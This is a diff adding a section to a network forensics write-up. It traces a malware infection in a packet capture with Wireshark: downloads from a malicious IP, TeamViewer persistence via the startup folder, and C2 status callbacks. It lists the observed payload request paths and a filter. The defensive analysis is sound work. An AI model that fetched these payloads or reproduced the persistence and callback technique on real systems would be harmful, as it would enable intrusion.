@@ -87,7 +87,46 @@ A reverse DNS on the `host: 5.252.153.241` confirms this is the domain where our
 
 ![image](https://github.com/user-attachments/assets/0cf98ab9-2d9c-41d0-bbd3-00701e39f36f)
 
-The next step in the investigation was to determine if the script was executed, and what hapened next. 
+Continuining to navigate this stream, we can see that an additional GET request is made to `/1517096937`. It repeatedly tries to get this file, returning multiple `HTTP/1.1 404 Not Found`. It does eventually return a `HTTP/1.1 200 OK`, however the repeated not found responses indicate malware behaviour. 
+
+Digging deeper into the stream, we have more successful GET requests for file downloads. These are then saved to `C:\ProgramData\huo`. Below is an overview of the 4 files from this HTTP stream, related to our suspicious host `hosted-by.csrp.host`.
+
+<img width="721" alt="image" src="https://github.com/user-attachments/assets/f20b8932-edcc-4a28-bc95-2f6d31fabb7d" />
+
+By key-word searching for `create-shortcut` I discovered that `TeamViewer.exe` was added to the start up folder, ensuring persistence on reboot. 
+
+<img width="684" alt="image" src="https://github.com/user-attachments/assets/42ba9881-8647-4520-8e0d-8a8afe8df2a4" />
+
+Furthermore, this function sends a "log" or execution result back to the attacker's Command & Control (C2) server.
+
+<img width="351" alt="image" src="https://github.com/user-attachments/assets/3e39c341-dbb4-4244-a5f3-4a43ddc1a3f4" />
+
+For an overview of GET requests from this malicious IP, I ran the following filter:
+
+```
+http.request.method == "GET" && ip.dst == 5.252.153.241
+```
+
+<img width="1435" alt="image" src="https://github.com/user-attachments/assets/c54a3e4d-e888-4cdb-bd57-ec2ba828f18e" />
+
+Which confirms our 5 critical payloads which are worth investigating. Additionally, the exfiltration callback, which confirms successful injection and startup persistence. 
+
+```
+GET /api/file/get-file/29842.ps1
+GET /api/file/get-file/TeamViewer
+GET /api/file/get-file/Teamviewer_Resource_fr
+GET /api/file/get-file/TV
+GET /api/file/get-file/pas.ps1
+GET /1517096937?k=message%20=%20startup%20status%20=%20success
+GET /1517096937?k=message%20=%20startup%20status%20=%20success
+```
+
+### 3. Exporting HTTP objects - Investigating the payloads
+By navigating to **File -> Export Objects -> HTTP**, and applying filename extension filters, I was able to export the files we have flagged as malicious. Example:
+
+<img width="926" alt="image" src="https://github.com/user-attachments/assets/44d2ab75-d6d4-45da-bc57-d175135d4c8c" />
+
+Each exported file was then reviewed for indicators of compromise. While a full dynamic analysis is outside the scope of this project, static inspection and threat intelligence lookups were performed to identify common traits or known signatures.
 
 
 
